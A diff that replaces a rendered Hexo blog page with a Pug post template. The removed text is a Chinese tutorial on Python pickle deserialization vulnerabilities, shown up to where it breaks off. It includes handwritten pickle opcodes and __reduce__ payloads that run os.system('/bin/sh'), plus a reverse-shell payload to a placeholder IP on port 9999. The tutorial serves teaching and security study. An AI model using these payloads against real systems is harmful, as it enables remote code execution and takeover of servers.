@@ -1,289 +1,52 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>一篇文章带你理解漏洞之 Python 反序列化漏洞 | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">一篇文章带你理解漏洞之 Python 反序列化漏洞</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">一篇文章带你理解漏洞之 Python 反序列化漏洞</h1><div class="post-meta">Nov 12, 2018<span> | </span><span class="category"><a href="/categories/漏洞分析/">漏洞分析</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-Python-的序列化和反序列化是什么"><span class="toc-number">2.</span> <span class="toc-text">0X01 Python 的序列化和反序列化是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-用代码展示序列化和反序列化的过程："><span class="toc-number">2.1.</span> <span class="toc-text">1.用代码展示序列化和反序列化的过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#序列化示例代码："><span class="toc-number">2.1.1.</span> <span class="toc-text">序列化示例代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#结果："><span class="toc-number">2.1.2.</span> <span class="toc-text">结果：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#反序列化示例代码："><span class="toc-number">2.1.3.</span> <span class="toc-text">反序列化示例代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#结果：-1"><span class="toc-number">2.1.4.</span> <span class="toc-text">结果：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-用语言来描述序列化和反序列化的过程："><span class="toc-number">2.2.</span> <span class="toc-text">2.用语言来描述序列化和反序列化的过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-序列化过程："><span class="toc-number">2.2.1.</span> <span class="toc-text">1.序列化过程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-反序列化过程："><span class="toc-number">2.2.2.</span> <span class="toc-text">2.反序列化过程：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-为什么要实现序列化和反序列化"><span class="toc-number">3.</span> <span class="toc-text">0X02 为什么要实现序列化和反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-python-是怎么实现序列化和反序列化的"><span class="toc-number">4.</span> <span class="toc-text">0X03 python 是怎么实现序列化和反序列化的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-几个重要的函数"><span class="toc-number">4.1.</span> <span class="toc-text">1.几个重要的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-PVM-的组成"><span class="toc-number">4.2.</span> <span class="toc-text">2.PVM 的组成</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-引擎的作用"><span class="toc-number">4.2.1.</span> <span class="toc-text">1.引擎的作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-栈区的作用"><span class="toc-number">4.2.2.</span> <span class="toc-text">2.栈区的作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-标签区的作用"><span class="toc-number">4.2.3.</span> <span class="toc-text">3.标签区的作用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-PVM-操作码"><span class="toc-number">4.3.</span> <span class="toc-text">3.PVM 操作码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-反序列化流程"><span class="toc-number">4.4.</span> <span class="toc-text">4.反序列化流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-与-PHP-反序列化的对比"><span class="toc-number">5.</span> <span class="toc-text">0X04 与 PHP 反序列化的对比</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X05-Python-反序列化漏洞何来"><span class="toc-number">6.</span> <span class="toc-text">0X05 Python 反序列化漏洞何来</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-为什么出现反序列化漏洞"><span class="toc-number">6.1.</span> <span class="toc-text">1.为什么出现反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-反序列化漏洞往往出现在什么地方"><span class="toc-number">6.2.</span> <span class="toc-text">2.反序列化漏洞往往出现在什么地方</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-我们怎么利用反序列化漏洞"><span class="toc-number">6.3.</span> <span class="toc-text">3.我们怎么利用反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-理论基础"><span class="toc-number">6.3.1.</span> <span class="toc-text">1.理论基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-实践开始"><span class="toc-number">6.3.2.</span> <span class="toc-text">2.实践开始</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-问题出现"><span class="toc-number">6.3.3.</span> <span class="toc-text">3.问题出现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-问题解决"><span class="toc-number">6.3.4.</span> <span class="toc-text">4.问题解决</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-Python-反序列化漏洞如何防御"><span class="toc-number">7.</span> <span class="toc-text">0X06 Python 反序列化漏洞如何防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X07-参考"><span class="toc-number">8.</span> <span class="toc-text">0X07 参考</span></a></li></ol></div></div><div class="post-content"><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>在分析了 PHP 的反序列化漏洞以后我打算将这个反序列化漏洞从语言层面进行扩展，然后我就看中了 python ，网上搜了一下，国内系统的讲 Python 反序列化漏洞的文章比较少，内容也是零零散散，于是我打算自己分析一下 Python 反序列化漏洞造成的命令执行和任意代码执行，然后弥补这个空缺。</p>
-<h2 id="0X01-Python-的序列化和反序列化是什么"><a href="#0X01-Python-的序列化和反序列化是什么" class="headerlink" title="0X01 Python 的序列化和反序列化是什么"></a><strong>0X01 Python 的序列化和反序列化是什么</strong></h2><p>Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。</p>
-<h3 id="1-用代码展示序列化和反序列化的过程："><a href="#1-用代码展示序列化和反序列化的过程：" class="headerlink" title="1.用代码展示序列化和反序列化的过程："></a><strong>1.用代码展示序列化和反序列化的过程：</strong></h3><p>为了看起来直观一些，我写了一个示例代码：</p>
-<a id="more"></a>
-<h4 id="序列化示例代码："><a href="#序列化示例代码：" class="headerlink" title="序列化示例代码："></a><strong>序列化示例代码：</strong></h4><pre><code>import pickle
-class People(object):
-    def __init__(self,name = &quot;K0rz3n&quot;):
-        self.name = name
+extends base
 
-    def say(self):
-        print &quot;Hello ! My friends&quot;
+block title
+  title= page.title + ' | ' + config.title
 
-a=People()
-c=pickle.dumps(a)
-print c
-</code></pre><h4 id="结果："><a href="#结果：" class="headerlink" title="结果："></a><strong>结果：</strong></h4><pre><code>ccopy_reg
-_reconstructor
-p0
-(c__main__
-people
-p1
-c__builtin__
-object
-p2
-Ntp3
-Rp4
-(dp5
-S&apos;name&apos;
-p6
-S&apos;K0rz3n&apos;
-p7
-sb.
-</code></pre><p>先不要管这些乱七八糟的符号是什么(这是 PVM 虚拟机可以识别的有特殊含义的符号，我在后面会说)，我们先看一下我们认识的，可以清楚地看到 我们对象的属性  name K0rz3n 我们对象所属的类 people 都已近存储在里面了，如果了解过 PHP 反序列化漏洞，你一定知道这和 PHP 的序列化的内容大同小异，因为 PHP 也是将类名和对象的属性序列化进去的。</p>
-<h4 id="反序列化示例代码："><a href="#反序列化示例代码：" class="headerlink" title="反序列化示例代码："></a><strong>反序列化示例代码：</strong></h4><pre><code>import pickle
-class People(object):
-    def __init__(self,name = &quot;K0rz3n&quot;):
-        self.name = name
+block content
+  .post
+    h1.post-title= page.title
+    .post-meta= page.date.format('ll')
+      if page.categories.length > 0
+        span= ' | '
+        span.category
+          for category in page.categories.toArray()
+            a(href=url_for(category.path))= category.name
+      if theme.busuanzi == true
+        script(src='https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js', async)
+        span#busuanzi_container_page_pv= ' | '
+          span#busuanzi_value_page_pv
+          span= ' ' + __('Hits')
+    if theme.duoshuo
+      a.ds-thread-count(data-thread-key=page.path, href=url_for(page.path) + '#comments')
+    if theme.disqus
+      a.disqus-comment-count(data-disqus-identifier=page.path, href=url_for(page.path) + '#disqus_thread')
+    if theme.gentie
+      a.ds-thread-count(class='cloud-tie-join-count', href=url_for(page.path) + '#comments')
+        span.join-count(style='font-size: 15px; color: #6E7173;') 0
+        span= ' ' + __('Discuss')
 
-    def say(self):
-        print &quot;Hello ! My friends&quot;
-
-a=People()
-c=pickle.dumps(a)
-d = pickle.loads(c)
-d.say()
-</code></pre><h4 id="结果：-1"><a href="#结果：-1" class="headerlink" title="结果："></a><strong>结果：</strong></h4><pre><code>Hello ! My friends
-</code></pre><p>可以看到，我们成功通过反序列化的方式恢复了之前我们序列化进去的类对象并成功的执行了对象的方法</p>
-<blockquote>
-<p><strong>注意：</strong></p>
-<p>如果我在反序列化以前删除了 People<br>这个类，那么我们在反序列化的过程中因为对象在当前的运行环境中没有找到这个类就会报错，从而反序列化失败。</p>
-</blockquote>
-<p><strong>示例代码：</strong></p>
-<pre><code>import pickle
-class People(object):
-    def __init__(self,name = &quot;K0rz3n&quot;):
-        self.name = name
-
-    def say(self):
-        print &quot;Hello ! My friends&quot;
-
-a=People()
-c=pickle.dumps(a)
-del People
-d = pickle.loads(c)
-</code></pre><p><strong>结果：</strong></p>
-<pre><code>AttributeError: &apos;module&apos; object has no attribute &apos;People&apos;
-</code></pre><h3 id="2-用语言来描述序列化和反序列化的过程："><a href="#2-用语言来描述序列化和反序列化的过程：" class="headerlink" title="2.用语言来描述序列化和反序列化的过程："></a><strong>2.用语言来描述序列化和反序列化的过程：</strong></h3><h4 id="1-序列化过程："><a href="#1-序列化过程：" class="headerlink" title="1.序列化过程："></a><strong>1.序列化过程：</strong></h4><p>(1)从对象提取所有属性,并将属性转化为名值对<br>(2)写入对象的类名<br>(3)写入名值对</p>
-<h4 id="2-反序列化过程："><a href="#2-反序列化过程：" class="headerlink" title="2.反序列化过程："></a><strong>2.反序列化过程：</strong></h4><p>(1)获取 pickle 输入流<br>(2)重建属性列表<br>(3)根据类名创建一个新的对象<br>(4)将属性复制到新的对象中</p>
-<blockquote>
-<p><strong>注意：</strong></p>
-<p>这个对象只要能在当前环境下创建起来就能完成反序列化，否则则不能实现对象的重构</p>
-</blockquote>
-<h2 id="0X02-为什么要实现序列化和反序列化"><a href="#0X02-为什么要实现序列化和反序列化" class="headerlink" title="0X02 为什么要实现序列化和反序列化"></a><strong>0X02 为什么要实现序列化和反序列化</strong></h2><p>和其他语言的序列化一样，Python 的序列化的目的也是为了保存、传递和恢复对象的方便性，在众多传递对象的方式中，序列化和反序列化可以说是最简单和最容易试下的方式</p>
-<h2 id="0X03-python-是怎么实现序列化和反序列化的"><a href="#0X03-python-是怎么实现序列化和反序列化的" class="headerlink" title="0X03 python 是怎么实现序列化和反序列化的"></a><strong>0X03 python 是怎么实现序列化和反序列化的</strong></h2><h3 id="1-几个重要的函数"><a href="#1-几个重要的函数" class="headerlink" title="1.几个重要的函数"></a><strong>1.几个重要的函数</strong></h3><p>Python 为我们提供了两个比较重要的库 pickle 和 cPickle（其中 cpickle 底层使用 c 语言书写，速度是pickle 的 1000 倍，<strong>但是他们的调用接口是一样的，我这里就一 pickle 为例</strong>） 以及几个比较重要的函数来实现序列化和反序列化</p>
-<p><strong>序列化：</strong></p>
-<pre><code>pickle.dump(文件) 
-pickle.dumps(字符串)
-</code></pre><p><strong>反序列化:</strong></p>
-<pre><code>pickle.load(文件)
-pickle.loads(字符串)
-</code></pre><p>但是底层是怎么实现的呢？这里就不得不提及 PVM(python 虚拟机) 了，它是实现 Python 序列化和反序列化的最根本的东西</p>
-<h3 id="2-PVM-的组成"><a href="#2-PVM-的组成" class="headerlink" title="2.PVM 的组成"></a><strong>2.PVM 的组成</strong></h3><p>PVM 由三个部分组成，引擎（或者叫指令分析器），栈区、还有一个 Memo (这个我也不知道怎么解释，我们姑且叫它 “标签区“)</p>
-<h4 id="1-引擎的作用"><a href="#1-引擎的作用" class="headerlink" title="1.引擎的作用"></a><strong>1.引擎的作用</strong></h4><p>从头开始读取流中的操作码和参数，并对其进行处理,zai在这个过程中改变 栈区 和 标签区，处理结束后到达栈顶，形成并返回反序列化的对象</p>
-<h4 id="2-栈区的作用"><a href="#2-栈区的作用" class="headerlink" title="2.栈区的作用"></a><strong>2.栈区的作用</strong></h4><p>作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化，并最终在栈上生成发序列化的结果</p>
-<h4 id="3-标签区的作用"><a href="#3-标签区的作用" class="headerlink" title="3.标签区的作用"></a><strong>3.标签区的作用</strong></h4><p>数据的一个索引或者标记</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.png" alt="此处输入图片的描述"></p>
-<blockquote>
-<p><strong>注意：PVM 指令的书写规范</strong></p>
-<p>(1)操作码是单字节的<br>(2)带参数的指令用换行符定界</p>
-</blockquote>
-<h3 id="3-PVM-操作码"><a href="#3-PVM-操作码" class="headerlink" title="3.PVM 操作码"></a><strong>3.PVM 操作码</strong></h3><p>为了表达的清楚完整我直接附上截图</p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20PVM%20%E6%93%8D%E4%BD%9C%E7%A0%811.png" alt="此处输入图片的描述"></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20PVM%20%E6%93%8D%E4%BD%9C%E7%A0%812.png" alt="此处输入图片的描述"></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20PVM%20%E6%93%8D%E4%BD%9C%E7%A0%813.png" alt="此处输入图片的描述"></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20PVM%20%E6%93%8D%E4%BD%9C%E7%A0%814.png" alt="此处输入图片的描述"></p>
-<blockquote>
-<p><strong>这里面要重点关注几个</strong></p>
-<p>S : 后面跟的是字符串<br>( ：作为命令执行到哪里的一个标记<br>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中<br>c ：定义模块名和类名（模块名和类名之间使用回车分隔）<br>R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中<br>. ：点号是结束符<strong>（图中没有，这里补充）</strong></p>
-</blockquote>
-<h3 id="4-反序列化流程"><a href="#4-反序列化流程" class="headerlink" title="4.反序列化流程"></a><strong>4.反序列化流程</strong></h3><p>序列化就是一个将对象转化成字符串的过程，这个我们能直接使用 pickle 实现，这个过程我们也无需利用和分析，这里不做深究，我这里就是说一下如何进行的反序列化</p>
-<p>我们将下面这个字符串存储为一个文件 shell.pickle</p>
-<pre><code>cos
-system
-(S&apos;/bin/sh&apos;
-tR.
-</code></pre><p>当我们使用下面这个函数对其进行加载的时候</p>
-<pre><code>&gt;&gt;&gt; import pickle
-&gt;&gt;&gt; pickle.load(open(&apos;shell.pickle&apos;))
-</code></pre><p><strong>执行结果如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pickle%20load%20%E7%9A%84%E5%88%B0shell1.png" alt="此处输入图片的描述"></p>
-<p>可以看到成功返回了 sh 的 shell </p>
-<p>我们现在来结合我们上面讲述的 PVM 的操作码看这个文件中的字符串是怎么一步一步执行的</p>
-<p>(1)c 后面是模块名，换行后是类名,于是将 os.system 放入栈中<br>(2)( 这个是标记符，我们将一个 Mark 放入栈中<br>(3)S 后面是字符串，我们放入栈中<br>(4)t 将栈中 Mark 之前的内容取出来转化成元祖，再存入栈中 （’/bin/sh’,），同时标记 Mark 消失<br>(5)R 将元祖取出，并将 callable 取出，然后将元祖作为 callable 的参数，并执行，对应这里就是 os.system(‘/bin/sh’),然后将结果再存入栈中</p>
-<blockquote>
-<p><strong>注意：</strong></p>
-<p>其实并不是所有的对象都能使用 pickle 进行序列化和反序列化，比如说 文件对象和网络套接字对象以及代码对象就不可以</p>
-</blockquote>
-<h2 id="0X04-与-PHP-反序列化的对比"><a href="#0X04-与-PHP-反序列化的对比" class="headerlink" title="0X04 与 PHP 反序列化的对比"></a><strong>0X04 与 PHP 反序列化的对比</strong></h2><p>相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象（这部分内容在后面会有所介绍），这样的话就大大拓宽了我们的攻击面。</p>
-<h2 id="0X05-Python-反序列化漏洞何来"><a href="#0X05-Python-反序列化漏洞何来" class="headerlink" title="0X05 Python 反序列化漏洞何来"></a><strong>0X05 Python 反序列化漏洞何来</strong></h2><h3 id="1-为什么出现反序列化漏洞"><a href="#1-为什么出现反序列化漏洞" class="headerlink" title="1.为什么出现反序列化漏洞"></a><strong>1.为什么出现反序列化漏洞</strong></h3><p>我们先来看一个 python <a href="https://docs.python.org/2/library/pickle.html" target="_blank" rel="noopener">官方文档</a>中的介绍</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D1.png" alt="此处输入图片的描述"></p>
-<p>说的意思就是官方并不没有义务保证你传入反序列化函数的内容是安全的，官方只负责反序列化，如果你传入不安全的内容那么自然就是不安全的</p>
-<h3 id="2-反序列化漏洞往往出现在什么地方"><a href="#2-反序列化漏洞往往出现在什么地方" class="headerlink" title="2.反序列化漏洞往往出现在什么地方"></a><strong>2.反序列化漏洞往往出现在什么地方</strong></h3><p>这里引用勾陈安全实验室的大佬<a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">写的</a></p>
-<p><strong>1.通常在解析认证token，session的时候</strong></p>
-<p>现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。P神的文章就有一个很好的redis+python反序列化漏洞的很好例子：<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html。" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html。</a><br><strong>2.可能将对象Pickle后存储成磁盘文件。</strong><br><strong>3.可能将对象Pickle后在网络中传输。</strong></p>
-<p>其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的</p>
-<h3 id="3-我们怎么利用反序列化漏洞"><a href="#3-我们怎么利用反序列化漏洞" class="headerlink" title="3.我们怎么利用反序列化漏洞"></a><strong>3.我们怎么利用反序列化漏洞</strong></h3><h4 id="1-理论基础"><a href="#1-理论基础" class="headerlink" title="1.理论基础"></a><strong>1.理论基础</strong></h4><p>利用的关键点还是如何构造我们的反序列化的 payload，这时候就不得不提到 <code>__reduce__</code> 这个魔法方法了（<strong>注意：</strong><code>__reduce__</code>方法是新式类(内置类)特有的,）</p>
-<p>关于新式类(内置类)和旧式类(自建类)，我这里简单的说一下，如果想看具体的，请转向 bendawang 师傅的这篇<a href="http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/" target="_blank" rel="noopener">博客</a> </p>
-<p>在 python2 中有两种声明类的方式，并且他们实例化的对象性质是不同的</p>
-<p><strong>示例代码：</strong></p>
-<p><strong>旧式类：</strong></p>
-<pre><code>&gt;&gt;&gt; class A():
-...     pass
-...
-&gt;&gt;&gt; a = A()
-&gt;&gt;&gt; type(a)
-&lt;type &apos;instance&apos;&gt;
-</code></pre><p><strong>新式类：</strong></p>
-<pre><code>&gt;&gt;&gt; class B(object):
-...     pass
-...
-&gt;&gt;&gt; b = B()
-&gt;&gt;&gt; type(b)
-&lt;class &apos;__main__.B&apos;&gt;
-</code></pre><p>但是 Python3 中解决了这个问题，在表现上消除了两者的差别，所以如果在 python2 中我们使用 <code>__reduce__</code> 要使用下面这种声明类的方法</p>
-<p>好了，回到正题，我们先看一下官方是怎么介绍这个 <code>__reduce__</code> 的，</p>
-<blockquote>
-<p>当序列化以及反序列化的过程中中碰到一无所知的扩展类型(<strong>这里指的就是新式类</strong>)的时候，可以通过类中定义的<code>__reduce__</code>方法来告知如何进行序列化或者反序列化</p>
-</blockquote>
-<p>也就是说我们，只要在新式类中定义一个 <code>__reduce__</code> 方法，我们就能在序列化的使用让这个类根据我们在<code>__reduce__</code> 中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候</p>
-<p>当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object(可调用的对象)，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的 PVM 的指令码，你就会发现这个返回值和其中的一个 R 指令非常的一致，（我猜测这个 R 指令码就是这个 <code>__reduce__</code> 方法的返回值的底层实现 ）</p>
-<p>这时候耳边传来：<strong>“程序员还是要用代码说话，你说什么人话呢！？”</strong>，好，那我赶紧用代码证明一下我上面啰嗦的废话吧。</p>
-<h4 id="2-实践开始"><a href="#2-实践开始" class="headerlink" title="2.实践开始"></a><strong>2.实践开始</strong></h4><p><strong>实力代码：</strong></p>
-<pre><code>import pickle
-import os
-class A(object):
-    def __reduce__(self):
-        a = &apos;/bin/sh&apos;
-        return (os.system,(a,))
-a = A()
-test = pickle.dumps(a)
-print test
-</code></pre><p><strong>结果：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20reduce1%20.png" alt="此处输入图片的描述"></p>
-<p>我们先不要管这里面的 p0 p1 p2 ,我上面说过了，这个东西是一个标签，有了它只是会出现一个存入内存的操作，p 后面的数字是 key ，因此对最后命令的执行没有任何影响</p>
-<p>为了比较方便，我再把上面的那段代码拿下来</p>
-<pre><code>cos
-system
-(S&apos;/bin/sh&apos;
-tR.
-</code></pre><p>是不是没有任何区别？没错，这再次证明了我的猜测： PVM 的 操作码 R 就是 <code>__reduce__</code> 的返回值的一个底层实现。</p>
-<p>我们让上面这个结果进行反序列化看一下结果</p>
-<p><strong>示例代码：</strong></p>
-<pre><code>import pickle
-import os
-class A(object):
-    def __reduce__(self):
-        a = &apos;/bin/sh&apos;
-        return (os.system,(a,))
-a = A()
-test = pickle.dumps(a)
-pickle.loads(test)
-</code></pre><p><strong>结果：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20reduce2%20.png" alt="此处输入图片的描述"></p>
-<p>那这样就非常的方便了，我们能利用这个 reduce 轻松构造我们想要执行的命令，甚至是执行代码（我们可以将 字符串部分换成 python -c “我们要执行的代码”）</p>
-<p><strong>我们尝试执行代码反弹 shell</strong> </p>
-<p><strong>示例代码：</strong></p>
-<pre><code>import pickle
-import os
-class A(object):
-    def __reduce__(self):
-        a = &quot;&quot;&quot;python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;&quot;&quot;&quot;
-        return (os.system,(a,))    
-a=A()
-result = pickle.dumps(a)
-pickle.loads(result)
-</code></pre><p>我在我的 vps 上开 9999 端口进行监听</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20reduce3%20.png" alt="此处输入图片的描述"></p>
-<p>我们运行我们的代码，然后成功反弹 shell</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20reduce4%20.png" alt="此处输入图片的描述"></p>
-<p><strong>补充：</strong></p>
-<p>又发现了一个比较好的命令能执行 系统命令，那就是  python pty 模块</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C1.png" alt="此处输入图片的描述"></p>
-<h4 id="3-问题出现"><a href="#3-问题出现" class="headerlink" title="3.问题出现"></a><strong>3.问题出现</strong></h4><p>我们发现如果我们单纯地使用 -c 参数执行代码的话，好像对一些简单的代码还行，但是如果出现了一些自定义函数了，那么在格式上就比较麻烦，那么有没有一种方式可以满足我们真正执行我们想执行的任何代码的目的呢？</p>
-<p>咦？你上面不是说 pickle 不能序列化代码对象吗？ 没错，pickle 的确不可以，不信我们试一试</p>
-<p>由于python可以在函数当中再导入模块和定义函数，所以我们可以将自己要执行的代码都写到一个函数里foo()</p>
-<p><strong>示例代码：</strong></p>
-<pre><code>import pickle
-
-def foo():
-    import os
-    def fib(n):
-        if n &lt;= 1:
-            return n
-        return fib(n-1) + fib(n-2)
-    print &apos;fib(10) =&apos;, fib(10)
-    os.system(&apos;/bin/sh&apos;)
-pickle.dumps(foo.func_code)
-</code></pre><p><strong>结果:</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C1.png" alt="此处输入图片的描述"></p>
-<h4 id="4-问题解决"><a href="#4-问题解决" class="headerlink" title="4.问题解决"></a><strong>4.问题解决</strong></h4><p>但是，我们还有一个利器，自从 python 2.6 起，Python 给我们提供了一个可以序列化code对象的模块–Marshal</p>
-<p>我们可以这样让这段代码序列化，同时为了显示方便，我们选择序列化后再进行 base64 处理</p>
-<p><strong>示例代码：</strong></p>
-<pre><code>import pickle
-import marshal
-import base64
-
-def foo():
-    import os
-    def fib(n):
-        if n &lt;= 1:
-            return n
-        return fib(n-1) + fib(n-2)
-    print &apos;fib(10) =&apos;, fib(10)
-    os.system(&apos;/bin/sh&apos;)
-
-code_serialized = base64.b64encode(marshal.dumps(foo.func_code))
-print code_serialized
-</code></pre><p><strong>结果：</strong></p>
